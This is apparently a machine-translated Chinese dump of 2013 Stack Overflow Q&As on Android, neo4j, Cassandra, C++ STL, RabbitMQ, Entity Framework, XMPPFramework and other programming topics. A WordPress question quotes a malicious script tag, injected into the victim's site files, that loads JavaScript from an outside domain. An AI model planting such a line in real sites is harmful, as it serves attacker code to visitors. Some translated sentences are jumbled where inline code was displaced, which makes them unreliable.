    viewA.setText("-" + "DOWN" + "-");
    return true;
}

@Override
public boolean onFling(MotionEvent e1, MotionEvent e2, float velocityX, float velocityY) {
    viewA.setText("-" + "FLING" + "-");
    return true;
}

@Override
public void onLongPress(MotionEvent e) {
    viewA.setText("-" + "LONG PRESS" + "-");
}

@Override
public boolean onScroll(MotionEvent e1, MotionEvent e2, float distanceX, float distanceY) {
    viewA.setText("-" + "SCROLL" + "-");
    return true;
}

@Override
public void onShowPress(MotionEvent e) {
    viewA.setText("-" + "SHOW PRESS" + "-");
}    

@Override
public boolean onSingleTapUp(MotionEvent e) {
    viewA.setText("-" + "SINGLE TAP UP" + "-");
    return true;
} 
```

}

以下是在 GestureDetector 类下使用触摸事件的方法。您可以控制每个事件。
希望对你有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-17T13:11:26.187

我找到了一个适合我的情况的 hacky 解决方案，但它显然是一个 hack。在 ViewGroup 的 onInterceptTouchEvent 中，如果之前有 MotionEvent.ACTION_DOWN 事件，我会吃掉所有的 MotionEvent.ACTION_UP。吃我的意思是我会从函数中返回true，并且动作取消将被发送到子视图，该子视图获得初始向下事件，因此点击将被忽略。然而，卷轴、甩动等按预期工作。

如果有人尝试这样做，则为代码示例。这里 lastMotionDown 是一个类级别的布尔变量。

```
 public boolean onInterceptTouchEvent(MotionEvent e) {

            if (this.lastMotionDown) {
                if (e.getAction() == MotionEvent.ACTION_DOWN) {
                    this.lastMotionDown = true;
                    return false;
                }
                this.lastMotionDown = false;
                if (e.getAction() == MotionEvent.ACTION_UP) {
                    //A click has happened prevent it.
                    return true;
                }
            }else {
                if (e.getAction() == MotionEvent.ACTION_DOWN) {
                    this.lastMotionDown = true;
                }
                return false;
            }
            return false;
}
```

# neo4j - 使用 Reduce 函数时排除没有属性的节点

> ID：16013522
> 
> 赞同：1
> 
> 时间：2013-04-15T11:01:45.883
> 
> 标签：neo4j, cypher

我有一个工厂节点和一堆使用工厂创建的节点。工厂是我道路的起点。我想去所有创建的节点并对一个属性执行一些算术并汇总结果。问题是工厂节点没有该属性，我无法弄清楚如何从我的路径中删除该节点或在减少功能期间忽略它。这是我的查询的简化形式。

START FactoryNode = node(30) MATCH Path = FactoryNode -[:CREATEDNODES]-> CreatedNode RETURN reduce(total = 0, n in nodes(Path) : total + n.Score);

服务器发疯是因为 FactoryNode 没有属性 Score。

请帮忙！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-16T16:31:37.523

不确定是否可以在reduce的表达式中使用函数，但是您可以尝试

```
START FactoryNode = node(30)
MATCH Path = FactoryNode -[:CREATEDNODES]-> CreatedNode
RETURN reduce(total = 0, n in nodes(Path) : total + COALESCE(n.Score?,0)); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-15T14:32:17.350

Consider checking for properties, [http://docs.neo4j.org/chunked/milestone/query-where.html#where-property-exists](http://docs.neo4j.org/chunked/milestone/query-where.html#where-property-exists)

# operating-system - 从函数中调用 minix _syscall()

> ID：16013532
> 
> 赞同：1
> 
> 时间：2013-04-15T11:02:45.290
> 
> 标签：operating-system, system-calls, minix

关于我编写的系统调用，我最近在 minix 中遇到了一个非常奇怪的问题。基本上，代码在 main() 函数中运行良好，并且调用完成了它应该做的事情。但是，如果我将代码放在一个函数中并从 main() 中调用该函数，它就会失败。这是一个例子：

```
void do_foo()
{
    message m;
    _syscall(FS_PROC_NR, FOO, &m);
}

int main(int argc, char* argv[])
{
    /* works */
    message m;
    _syscall(FS_PROC_NR, FOO, &m);

    /* does not work */
    do_foo();
} 
```

看起来如果你从你的代码中调用一个函数，它应该做同样的事情，就好像你只是在 main 函数中编写代码一样。我在这里想念什么？

# spring-mvc - 基于 cassandra 的 Web 应用程序中的分页

> ID：16013536
> 
> 赞同：1
> 
> 时间：2013-04-15T11:02:54.037
> 
> 标签：spring-mvc, cassandra, hector

我如何在基于 cassandra 的 Web 应用程序中进行分页。我在服务器端使用spring MVC，在客户端使用jquery。我试过[这个](https://github.com/zznate/hector-examples/blob/master/src/main/java/com/riptano/cassandra/hector/example/PaginateGetRangeSlices.java)，但不满意。

我的行键是 UUIDType 并且每次我从客户端浏览器将开始键作为字符串发送时，所以不知道如何将其转换回 UUID。将应用一个简单的例子。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-16T13:45:56.540

如果您将 PlayOrm 用于 cassandra，它会在您查询时返回一个光标，并且当您的第一页读取前 20 个结果并显示它时，下一页可以在您的会话中使用相同的光标，它会在它离开的地方继续再次重新扫描前 20 行。

院长

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-15T11:07:18.610

Spring-data 预装了这个功能：

[http://static.springsource.org/spring-data/data-jpa/docs/current/reference/html/repositories.html#web-pagination](http://static.springsource.org/spring-data/data-jpa/docs/current/reference/html/repositories.html#web-pagination)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-12-18T22:10:34.620

我会建议适用于任何语言的通用解决方案。我使用 python pycassa 来解决这个问题：

第一种方法：

```
-Say if column_count = 10 (How many results to display on front end) 
-collect first 11 rows, sort first 10, send it to user (front end) as JSON object and also parameter last=11th_column
-User then calls for page 2, with prev = 1st_column_id, column_start=11th_column and column_count = 10\. Based on this, I query cassandra like cf.get('cf', key, column_start=11th_column, column_count=10)
-This way, I can traverse, next page and previous page.
-Only issue with this approach is, I don't have all columns in super column sorted. So this did not work. 
```

第二种方法（我在生产中使用）：

```
-fetch all super columns and columns for a row key. e.g in python pycassa, cf.get('cf',key)
-Sort this in python using sorted and lambda function based on column values.
-Once sorted, prepare buckets and each bucked size is of page size/column count. Also filter out any rogue data if needed before bucketing.
-Store page by page results in Redis with keys such as 'row_key|page_1|super_column' and keep refreshing redis periodically. 
```

我的第二种方法对中小数据量非常有效。

# xcode - 有没有人通过 XCode 命令行工具使用过 oTool 命令？

> ID：16013538
> 
> 赞同：0
> 
> 时间：2013-04-15T11:02:55.887
> 
> 标签：xcode, otool

有没有人通过 XCode 命令行工具使用过 oTool 命令？我想使用 oTool 为 iPAd 应用程序检查堆栈保护标志设置。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-27T01:47:03.527

otool -Iv $app_binary_path |grep stack_chk

# php - Symfony 1.4，全局对象：放在哪里？

> ID：16013539
> 
> 赞同：0
> 
> 时间：2013-04-15T11:02:57.880
> 
> 标签：php, symfony-1.4

我需要在 Symfony 1.4 系统中存储一个“全局”对象，所以不是通常的类到`/lib`目录中。这甚至可能是一个完全静态的或单例的东西——但现在每个人都说“使用依赖注入！”。顺便说一句，这个对象必须只存在于**一个**实例中，不能少，不能多，并且在所有控制器中都可以访问（而不是在视图中）我认为它应该在链过滤器中创建。接着？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T11:35:30.090

您可以将对象保留在 sfContext 中，或者，如果您想让它成为一个单独的对象，请实现一个静态方法`::getInstance()`，该方法将返回对象的实例或初始化它（如果实例不存在）。这样，您甚至不必初始化过滤器链中的对象（除非您需要将一些参数传递给构造函数）。

# javascript - 如何监控哪些文件正在给别人写代码？

> ID：16013544
> 
> 赞同：0
> 
> 时间：2013-04-15T11:03:09.763
> 
> 标签：javascript, wordpress, exploit

似乎存在一个新的漏洞利用/黑客攻击，插件在我的服务器上每个安装文件的每个结束标记之前`Wordpress`写入文件。它在每个结束头标记之前编写此代码：`.js``</head>``Wordpress``.php`

```
<script language="JavaScript" src="http://abtt.tv/modules/mod_servises/ua.js" type="text/javascript"></script> 
```

我的问题是，我将如何查找哪些文件正在向其他人编写代码？这样我就可以找到它正在执行的插件，因为我在被感染的子域中安装了几个 WP，但不知道它来自哪个插件！我确信必须有一种方法来监控这一点，无论是我的托管公司还是我。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T11:16:35.540

如果您的网站遭到入侵，您最好恢复备份，但如果您没有备份，您最好使用全新安装。但是，如果您仍然想尝试“修复”它，您可以检查一些文件以查找启动器、头主题文件、函数文件和所有插件文件，以确保它没有加入插件运行。

您应该搜索的功能被调用`wp_enqueue_script`

# c++ - 如何从 STL 容器中擦除元素？

> ID：16013545
> 
> 赞同：41
> 
> 时间：2013-04-15T11:03:13.680
> 
> 标签：c++, c++11, stl, std

如何从 STL 容器中删除具有指定*值*或满足某些*条件*的元素？

对于不同种类的容器，是否有一种通用或统一的方法来做到这一点？

* * *

## 回答 #1

> 赞同：59
> 
> 时间：2013-04-15T11:03:13.680

不幸的是，没有一个*统一*的接口或模式用于从 STL 容器中擦除元素。但是出现了三种行为：

## std::vector 模式

要从 a 中擦除满足特定条件的元素**`std::vector`**，一种常见的技术是所谓的[**擦除删除习语**](http://en.wikipedia.org/wiki/Erase-remove_idiom)。

如果`v`是 的一个实例`std::vector`，并且我们想`x`从向量中删除具有值的元素，可以使用如下代码：

```
// Erase elements having value "x" from vector "v"
v.erase( std::remove(v.begin(), v.end(), x), v.end() ); 
```

如果擦除元素要满足的标准比简单的*“要擦除的元素 == x”*`std::remove_if()`更复杂，则可以使用该算法代替`std::remove()`：

```
// Erase elements matching "erasing_condition" from vector "v"
v.erase( std::remove_if(v.begin(), v.end(), erasing_condition), v.end() ); 
```

where`erasing_condition`是一个一元谓词，可以用多种形式表示：例如，它可以是一个以向量元素类型为输入的返回**`bool`函数**（因此，如果返回值为`true`，则该元素将从向量中删除；如果是`false`，则获胜't); 或者它可以直接表示*为***lambda**；它可以是[**函子**](https://stackoverflow.com/questions/356950/c-functors-and-their-uses)；等等

（两者都是来自标题`std::remove()`的`std::remove_if()`通用算法。）`<algorithm>`

这是[来自维基百科](http://en.wikipedia.org/wiki/Erase-remove_idiom)的明确解释：

> 该`algorithm`库为此提供了`remove`和`remove_if` 算法。因为这些算法对由两个前向迭代器表示的一系列元素进行操作，所以它们不了解底层容器或集合。因此，实际上没有从容器中删除任何元素。相反，所有不符合删除条件的元素都以相同的相对顺序放在范围的前面。其余元素处于有效但未指定的状态。完成此操作后，`remove`返回一个迭代器，该迭代器指向最后一个未删除的元素。
> 
> 要真正从容器中删除元素，`remove`需要结合容器的`erase`成员函数，因此得名“erase-remove idiom”。

基本上，`std::remove()`将*不满足*`std::remove_if()`擦除标准的元素压缩到范围的前面（即到 的开头），然后实际上从容器中消除剩余的元素。*`vector``erase()`*

 *此模式也适用于其他容器，例如**`std::deque`**.

## std::list 模式

要从 a**`std::list`**中删除元素，可以使用 simple**`remove()`和`remove_if()`方法**：

```
// Erase elements having value "x" from list "l"
l.remove( x )

// Erase elements satisfying "erasing_condition" from list "l"
l.remove_if( erasing_condition ); 
```

（Where`erasing_condition`是一元谓词，具有与`std::remove_if()`上一节讨论的相同特征。）

相同的模式可以应用于类似的容器，例如**`std::forward_list`**.

## 关联容器（例如 std::map、std::set、...）模式

***`std::map`**、**`std::set`**、等*关联容器***`std::unordered_map`**遵循此处描述的常见模式：*

 *1.  如果擦除条件是简单的键匹配（即*“擦除具有键 x 的元素”* ），则可以调用一个简单的**`erase()`方法：**

    ```
    // Erase element having key "k" from map "m":
    m.erase( k ); 
    ```

2.  如果擦除条件更复杂，并且由一些自定义一元谓词表示（例如*“擦除所有奇数元素”*），则`for`可以使用循环（在循环体中检查显式擦除条件，并调用`erase(iterator)`方法）：

    ```
    //
    // Erase all elements from associative container "c", satisfying "erasing_condition":
    //
    for (auto it = c.begin(); it != c.end(); /* "it" updated inside loop body */ )
    {
        if ( erasing_condition(*it) )
        {   
            // Erase the element matching the specified condition 
            // from the associative container.
            it = c.erase(it);

            // Note:
            // erase() returns an iterator to the element 
            // that follows the last element removed, 
            // so we can continue the "for" loop iteration from that position.
        }
        else
        {
            // Current element does _not_ satisfy erasing condition,
            // so we can just move on to the next element.
            ++it;
        }       
    } 
    ```

## 需要统一的方法

从上面的分析中可以看出，不幸的是，从 STL 容器中擦除元素并没有统一的通用方法。

下表总结了上述模式：

> ```
> ----------------+------------------------------------------             
>    Container    |            Erasing Pattern
> ----------------+------------------------------------------                
>                 |
>  vector         |    Use erase-remove idiom.
>  deque          |
>                 |
> ----------------+------------------------------------------               
>                 |
>  list           |    Call remove()/remove_if() methods.
>  forward_list   |
>                 |
> ----------------+------------------------------------------  
>                 |
>  map            |    Simple erase(key) method call, 
>  set            |    or 
>  unordered_map  |    loop through the container,
>  multimap       |    and call erase(iterator) on matching
>                 |    condition.
>  ...            |
>                 |
> ----------------+------------------------------------------ 
> ```

基于特定容器编写不同的特定代码容易出错、难以维护、难以阅读等。

但是，可以编写为不同容器类型*重载*`erase()`的通用名称（例如和`erase_if()`）的函数模板，并将上述模式实现嵌入到这些函数中。 因此，客户端可以简单地调用这些函数和泛型函数，编译器会根据容器类型将调用分派给正确的实现（在*编译时）。* *`erase()``erase_if()`*

 **[**Stephan T. Lavavej**](http://channel9.msdn.com/Series/C9-Lectures-Stephan-T-Lavavej-Standard-Template-Library-STL-/C9-Lectures-Stephan-T-Lavavej-Standard-Template-Library-STL-3-of-n#c634173340820000000)[在此处介绍](http://channel9.msdn.com/Series/C9-Lectures-Stephan-T-Lavavej-Standard-Template-Library-STL-/C9-Lectures-Stephan-T-Lavavej-Standard-Template-Library-STL-3-of-n#c634173340820000000)[了](http://channel9.msdn.com/Series/C9-Lectures-Stephan-T-Lavavej-Standard-Template-Library-STL-/C9-Lectures-Stephan-T-Lavavej-Standard-Template-Library-STL-3-of-n#c634173340820000000)**一种更优雅的方法，使用模板元编程技术。******

# python - 启用持久传递模式后，强制工作人员立即接收失败的消息

> ID：16013548
> 
> 赞同：2
> 
> 时间：2013-04-15T11:03:20.647
> 
> 标签：python, python-2.7, rabbitmq, pika, python-pika

我设置了一个[RabbitMQ 服务器，在其中使用](http://www.rabbitmq.com/)[Python-Pika](https://github.com/pika/pika)获取消息。问题是，如果我启用了[持久传递模式](http://www.rabbitmq.com/releases/rabbitmq-java-client/current-javadoc/com/rabbitmq/client/MessageProperties.html)，并且工作人员无法处理消息。它不会释放消息，而是会一直保留到消息，直到 RabbitMQ 连接被重置。

有没有办法确保无法处理的消息在合理的时间范围内从可用的工作人员（包括同一个工作人员）再次被拾起？

**这是我当前的代码**

```
if success:
    ch.basic_ack(delivery_tag=method.delivery_tag)
else:
    syslog.syslog('Error (Callback) -- Failed to process payload: %s' % body) 
```

这个想法是我永远不想丢失一条消息，而是希望它被重新发布，或者如果它失败了，我希望它再次被拾起。在工作人员成功处理消息之前，应该始终如此。这通常发生在其中一名工作人员无法打开与 HTTP 服务器的连接时。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T11:58:35.470

我终于弄清楚为什么会这样了。我没有意识到，当您完成一条消息时，仅仅确认是不够的，而且还必须拒绝任何您无法使用`channel.basic_reject`. 这似乎很明显，但这不是[AMQP](http://www.rabbitmq.com/amqp-0-9-1-reference.html)的默认行为。

基本上我们必须使用`basic_reject`with `requeue`set to来释放消息`True`。这里的重要因素是`requeue`防止消息被丢弃的关键字，而是将其再次排队，以便我们可用的工作人员之一可以处理它。

```
if success:
    # On Success - Mark message as processed.
    ch.basic_ack(delivery_tag=method.delivery_tag)
else:
    # Else - Mark message as rejected and move it back to the queue.
    ch.basic_reject(delivery_tag=method.delivery_tag, requeue=True) 
```

[我在这篇](http://gavinroy.com/deeper-down-the-rabbit-hole-of-message-redeli)文章中找到了一些非常有用的信息，并且在[这篇](http://www.rabbitmq.com/blog/2010/08/03/well-ill-let-you-go-basicreject-in-rabbitmq/)博文中有更多关于`reject`关键字的技术细节。

# android - 编辑文本样式

> ID：16013549
> 
> 赞同：2
> 
> 时间：2013-04-15T11:03:23.420
> 
> 标签：android, android-edittext

是否可以在`API 17`android 中操纵文本字段的样式`API 8`？

与高级 API 相比，低级 API 中的文本字段非常不同。有什么方法可以为这些组件提供统一的外观和感觉？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-11-13T18:02:35.347

要使用 Android v8 EditText 样式，请更改 editText 的背景：

android:background="@android:drawable/edit_text"

或使用 v8 中使用的整个样式：

```
<style name="Widget.EditText">
    <item name="android:focusable">true</item>
    <item name="android:focusableInTouchMode">true</item>
    <item name="android:clickable">true</item>
    <item name="android:background">@android:drawable/edit_text</item>
    <item name="android:textAppearance">?android:attr/textAppearanceMediumInverse</item>
    <item name="android:textColor">@android:color/primary_text_light</item>
    <item name="android:gravity">center_vertical</item>
</style> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-15T11:06:46.623

只有EditText？还是您希望每个小部件看起来都像全息前小部件？如果是这样，那么将其设置为您的主题将有所帮助：

```
<application
       [...]
        android:theme="@android:style/Theme" >
       [...]
</application> 
```

但是，如果您只想让 EditText 成为“un-holofied”，您可以这样做：

```
<EditText
      android:id="@+id/spinnermap"
      style="@style/MyEditText"
      android:layout_width="wrap_content"
      android:layout_height="wrap_content"
      android:layout_alignParentLeft="true"
      android:layout_centerVertical="true" /> 
```

值/样式.xml：

```
<style name="MyEditText" parent="android:Widget.Spinner"></style> 
```

并将你的 Theme 设置为 Holo(.Light) 和 Theme(.Light) for pre HC。

或者，如果您想将所有内容组合成一个主题，并且除了 EditText 小部件之外的所有内容都是全息的，那么您可以这样做：

values-v11/styles.xml: // v11 因为 pre HC 主题已经有 EditText 样式，你想要。

```
<style name="MyTheme" parent="@android:style/Theme.Holo"       
    <item name="android:editTextStyle">@style/MyEditText></item>
</style> 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-15T11:17:53.497

或者你可以使用这个：

[https://github.com/Prototik/HoloEverywhere](https://github.com/Prototik/HoloEverywhere)

如果您想在旧设备上安装 Holo（我的意思是您可以以相反的方式进行操作 - 将旧控件更改为新控件）。这个库也适用于 ActionBar Sherlock。

# c# - 2 个带有继承的 POCO 创建一个表而不是两个表

> ID：16013556
> 
> 赞同：0
> 
> 时间：2013-04-15T11:03:48.547
> 
> 标签：c#, inheritance, ef-code-first

我正在`Database`为假期系统创建一个相当简单的系统。

**实体**

`Employee`

```
public class Employee
{
  public int Id { get; set;}
  public string Username { get; set; }
  public LineManger Manager { get; set; }
} 
```

`LineManger`

```
public class LineManager : Employee
{
  public string CompanySection { get; set; }
} 
```

**关系**

如您所见，每个员工都有一个，`LineManger`但是一个`Employee`可能是一个`LineManager`.

在我的`DbContext`我有：

```
public DbSet<Employee> Employees { get; set; }
public DbSet<LineManager> Managers { get; set; }
public DbSet<HolidayConfiguration> Configurations { get; set; }
public DbSet<Holiday> Holidays { get; set; } 
```

当我`PM > Update-Database -verbose`第一次运行时，它只创建了一个`Employee`表，并且该表具有`CompanySection`并且`Manager_Id`不会映射到任何看到的地方，因为没有`LineManager`表。

关于为什么会发生这种情况的任何解释？它是否正确？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-15T11:14:14.893

它必须是这样的，因为每个 LineManager 都是一个 Employee，所以当您查询Employees 时，您也在寻找 LineManager。`DbSet<Employee> Employees`仅匹配一个表，因此 EF 创建表的唯一方法是将 LineManager 中的所有字段放入其中。

有时（当您有更多继承时）EF 创建特殊列，其中放置类名。

# ios - XMPPFramework - 未发送消息

> ID：16013558
> 
> 赞同：0
> 
> 时间：2013-04-15T11:03:58.543
> 
> 标签：ios, xmpp, xmppframework

我是新手`iOS`。我正在使用`XMPPFramework`. 但是最近几天我遇到了一个问题。找不到任何解决方案。问题是当我想向任何特定 ID 发送消息时，消息不会被发送。发送消息的动作方法是：

```
- (IBAction)sendMsg:(id)sender 
{
    xmppStream = [[XMPPStream alloc] init];
    [xmppStream addDelegate:self delegateQueue:dispatch_get_main_queue()];

    NSString *messageStr = self.msgField.text;

    if ([messageStr length] > 0) 
    {

        NSXMLElement *body = [NSXMLElement elementWithName:@"body"];
        [body setStringValue:messageStr];

        NSXMLElement *message = [NSXMLElement elementWithName:@"message"];
        [message addAttributeWithName:@"type" stringValue:@"chat"];
        [message addAttributeWithName:@"to" stringValue:@"abc.codemen@gmail.com"];
        [message addChild:body];    
        [self.xmppStream sendElement:message];
    }
} 
```

`NSXMLElement`这是用于发送my的 sendElement 方法`XMPPStream.m`：

```
- (void)sendElement:(NSXMLElement *)element
{
    if (element == nil)
        return;

    dispatch_block_t block = ^{ @autoreleasepool {
        if (state == STATE_XMPP_CONNECTED)
            [self sendElement:element withTag:TAG_XMPP_WRITE_STREAM];
    }};

    if (dispatch_get_current_queue() == xmppQueue)
            block();
    else
            dispatch_async(xmppQueue, block);
} 
```

但是我发现消息发送的方法调用没有进入if语句！

```
if (state == STATE_XMPP_CONNECTED)
{
    [self sendElement:element withTag:TAG_XMPP_WRITE_STREAM];
} 
```

我认为这就是为什么我不能向任何 id 发送消息的原因。请通过建议我是错的还是对的来帮助我，我该如何解决这个问题？

这是我的 Appdelegate 类：

```
#import "iPhoneXMPPAppDelegate.h"
#import "GCDAsyncSocket.h"
#import "XMPP.h"
#import "XMPPReconnect.h"
#import "XMPPCapabilitiesCoreDataStorage.h"
#import "XMPPRosterCoreDataStorage.h"
#import "XMPPvCardAvatarModule.h"
#import "XMPPvCardCoreDataStorage.h"
#import "DDLog.h"
#import "DDTTYLogger.h"
#import <CFNetwork/CFNetwork.h>
#import "ParentLoginViewController.h"
#import "Child.h"

// Log levels: off, error, warn, info, verbose
#if DEBUG
static const int ddLogLevel = LOG_LEVEL_VERBOSE;
#else
static const int ddLogLevel = LOG_LEVEL_INFO;
#endif

@implementation iPhoneXMPPAppDelegate

//@synthesize window = _window;
@synthesize managedObjectContext = __managedObjectContext;
@synthesize managedObjectModel = __managedObjectModel;
@synthesize persistentStoreCoordinator = __persistentStoreCoordinator;
@synthesize xmppStream;
@synthesize xmppReconnect;
@synthesize xmppRoster;
@synthesize xmppRosterStorage;
@synthesize xmppvCardTempModule;
@synthesize xmppvCardAvatarModule;
@synthesize xmppCapabilities;
@synthesize xmppCapabilitiesStorage;
@synthesize window;
@synthesize navigationController;

static iPhoneXMPPAppDelegate *sharedInstance = nil;

// Get the shared instance and create it if necessary.
+ (iPhoneXMPPAppDelegate *)sharedInstance {
if (sharedInstance == nil) {
    sharedInstance = [[super allocWithZone:NULL] init];
}

return sharedInstance;
}

- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions
{

[DDLog addLogger:[DDTTYLogger sharedInstance]];

[self setupStream];

if (![self connect])
{
        dispatch_time_t popTime = dispatch_time(DISPATCH_TIME_NOW, 0.0 *       NSEC_PER_SEC);
        dispatch_after(popTime, dispatch_get_main_queue(), ^(void){

            ParentLoginViewController *parent = [[ParentLoginViewController alloc] initWithNibName:@"ParentLoginViewController" bundle:nil];
            [navigationController presentModalViewController:parent  animated:YES];
        });
    }

    return YES;
}

- (void)dealloc
{
[self teardownStream];
}

- (NSManagedObjectContext *)managedObjectContext_roster
{
    return [xmppRosterStorage mainThreadManagedObjectContext];
}

- (NSManagedObjectContext *)managedObjectContext_capabilities
{
    return [xmppCapabilitiesStorage mainThreadManagedObjectContext];
}

- (void)setupStream
{
    NSAssert(xmppStream == nil, @"Method setupStream invoked multiple times");

    xmppStream = [[XMPPStream alloc] init];

    #if !TARGET_IPHONE_SIMULATOR
    {
        xmppStream.enableBackgroundingOnSocket = YES;
    }
    #endif

    xmppReconnect = [[XMPPReconnect alloc] init];

    xmppRosterStorage = [[XMPPRosterCoreDataStorage alloc] init];

    xmppRoster = [[XMPPRoster alloc] initWithRosterStorage:xmppRosterStorage];

    xmppRoster.autoFetchRoster = YES;
    xmppRoster.autoAcceptKnownPresenceSubscriptionRequests = YES;

    xmppvCardStorage = [XMPPvCardCoreDataStorage sharedInstance];
    xmppvCardTempModule = [[XMPPvCardTempModule alloc]   initWithvCardStorage:xmppvCardStorage];

    xmppvCardAvatarModule = [[XMPPvCardAvatarModule alloc] initWithvCardTempModule:xmppvCardTempModule];

    xmppCapabilitiesStorage = [XMPPCapabilitiesCoreDataStorage sharedInstance];
    xmppCapabilities = [[XMPPCapabilities alloc] initWithCapabilitiesStorage:xmppCapabilitiesStorage];

    xmppCapabilities.autoFetchHashedCapabilities = YES;
    xmppCapabilities.autoFetchNonHashedCapabilities = NO;

    // Activate XMPP modules

    [xmppReconnect         activate:xmppStream];
    [xmppRoster            activate:xmppStream];
    [xmppvCardTempModule   activate:xmppStream];
    [xmppvCardAvatarModule activate:xmppStream];
    [xmppCapabilities      activate:xmppStream];

    // Add ourself as a delegate to anything we may be interested in

    [xmppStream addDelegate:self delegateQueue:dispatch_get_main_queue()];
    [xmppRoster addDelegate:self delegateQueue:dispatch_get_main_queue()];
    [xmppStream setHostName:@"talk.google.com"];
    [xmppStream setHostPort:5222];

    // You may need to alter these settings depending on the server you're connecting to
    allowSelfSignedCertificates = NO;
    allowSSLHostNameMismatch = NO;
}

- (void)teardownStream
{
    [xmppStream removeDelegate:self];
    [xmppRoster removeDelegate:self];

    [xmppReconnect         deactivate];
    [xmppRoster            deactivate];
    [xmppvCardTempModule   deactivate];
    [xmppvCardAvatarModule deactivate];
    [xmppCapabilities      deactivate];

    [xmppStream disconnect];

    xmppStream = nil;
    xmppReconnect = nil;
    xmppRoster = nil;
    xmppRosterStorage = nil;
    xmppvCardStorage = nil;
    xmppvCardTempModule = nil;
    xmppvCardAvatarModule = nil;
    xmppCapabilities = nil;
    xmppCapabilitiesStorage = nil;
}

- (void)goOnline
{
    XMPPPresence *presence = [XMPPPresence presence]; // type="available" is implicit

    [[self xmppStream] sendElement:presence];
}

- (void)goOffline
{
    XMPPPresence *presence = [XMPPPresence presenceWithType:@"unavailable"];

    [[self xmppStream] sendElement:presence];
}

- (BOOL)connect
{
    if (![xmppStream isDisconnected]) {
        return YES;
    }

    NSString *myJID = [[NSUserDefaults standardUserDefaults] stringForKey:kXMPPmyJID];
    NSString *myPassword = [[NSUserDefaults standardUserDefaults] stringForKey:kXMPPmyPassword];

    if (myJID == nil || myPassword == nil) {
        return NO;
    }

    [xmppStream setMyJID:[XMPPJID jidWithString:myJID]];
    password = myPassword;

    NSError *error = nil;
    if (![xmppStream connect:&error])
    {
        UIAlertView *alertView = [[UIAlertView alloc] initWithTitle:@"Error connecting" 
                                                        message:@"See console for error details." 
                                                       delegate:nil 
                                              cancelButtonTitle:@"Ok" 
                                              otherButtonTitles:nil];
        [alertView show];

        DDLogError(@"Error connecting: %@", error);

        return NO;
    }

    return YES;
}

- (void)disconnect
{
    [self goOffline];
    [xmppStream disconnect];
}

- (void)applicationWillEnterForeground:(UIApplication *)application 
{
    DDLogVerbose(@"%@: %@", THIS_FILE, THIS_METHOD);
}

- (void)xmppStream:(XMPPStream *)sender socketDidConnect:(GCDAsyncSocket *)socket 
{
    DDLogVerbose(@"%@: %@", THIS_FILE, THIS_METHOD);
}

- (void)xmppStream:(XMPPStream *)sender willSecureWithSettings:(NSMutableDictionary  *)settings
{
    DDLogVerbose(@"%@: %@", THIS_FILE, THIS_METHOD);

    if (allowSelfSignedCertificates)
    {
        [settings setObject:[NSNumber numberWithBool:YES] forKey:(NSString  *)kCFStreamSSLAllowsAnyRoot];
    }

    if (allowSSLHostNameMismatch)
    {
        [settings setObject:[NSNull null] forKey:(NSString *)kCFStreamSSLPeerName];
    }

    else
    {
        NSString *expectedCertName = nil;

        NSString *serverDomain = xmppStream.hostName;
        NSString *virtualDomain = [xmppStream.myJID domain];

        if ([serverDomain isEqualToString:@"talk.google.com"])
        {
            if ([virtualDomain isEqualToString:@"gmail.com"])
            {
                expectedCertName = virtualDomain;
            }

            else
            {
                expectedCertName = serverDomain;
            }
        }

        else if (serverDomain == nil)
        {
            expectedCertName = virtualDomain;
        }

        else
        {
            expectedCertName = serverDomain;
        }

        if (expectedCertName)
        {
            [settings setObject:expectedCertName forKey:(NSString *)kCFStreamSSLPeerName];
        }
    }
}

- (void)xmppStreamDidSecure:(XMPPStream *)sender
{
    DDLogVerbose(@"%@: %@", THIS_FILE, THIS_METHOD);
}

- (void)xmppStreamDidConnect:(XMPPStream *)sender
{
    DDLogVerbose(@"%@: %@", THIS_FILE, THIS_METHOD);

    isXmppConnected = YES;

    NSError *error = nil;

    if (![[self xmppStream] authenticateWithPassword:password error:&error])
    {
        DDLogError(@"Error authenticating: %@", error);
    }
}

- (void)xmppStreamDidAuthenticate:(XMPPStream *)sender
{
    DDLogVerbose(@"%@: %@", THIS_FILE, THIS_METHOD);

    [self goOnline];
}

- (void)xmppStream:(XMPPStream *)sender didNotAuthenticate:(NSXMLElement *)error
{
    DDLogVerbose(@"%@: %@", THIS_FILE, THIS_METHOD);
}

- (BOOL)xmppStream:(XMPPStream *)sender didReceiveIQ:(XMPPIQ *)iq
{
    DDLogVerbose(@"%@: %@", THIS_FILE, THIS_METHOD);

    return NO;
}

- (void)xmppStream:(XMPPStream *)sender didReceiveMessage:(XMPPMessage *)message
{
    DDLogVerbose(@"%@: %@", THIS_FILE, THIS_METHOD);

    // A simple example of inbound message handling.

    if ([message isChatMessageWithBody])
    {
        NSLog(@"Message is: %@",message); 

        XMPPUserCoreDataStorageObject *user = [xmppRosterStorage userForJID:[message      from]                                                                  xmppStream:xmppStream managedObjectContext:[self managedObjectContext_roster]];

        NSString *body = [[message elementForName:@"body"] stringValue];
        NSString *displayName = [user displayName];

        if ([[UIApplication sharedApplication] applicationState] == UIApplicationStateActive)
        {
            UIAlertView *alertView = [[UIAlertView alloc] initWithTitle:displayName
                                                          message:body 
                                                         delegate:nil 
                                                cancelButtonTitle:@"Ok" 
                                                otherButtonTitles:nil];
            [alertView show];
        }
        else
        {
            // We are not active, so use a local notification instead
            UILocalNotification *localNotification = [[UILocalNotification alloc] init];
            localNotification.alertAction = @"Ok";
            localNotification.alertBody = [NSString stringWithFormat:@"From: %@\n\n%@",displayName,body];

            [[UIApplication sharedApplication] presentLocalNotificationNow:localNotification];
        }
    }
}

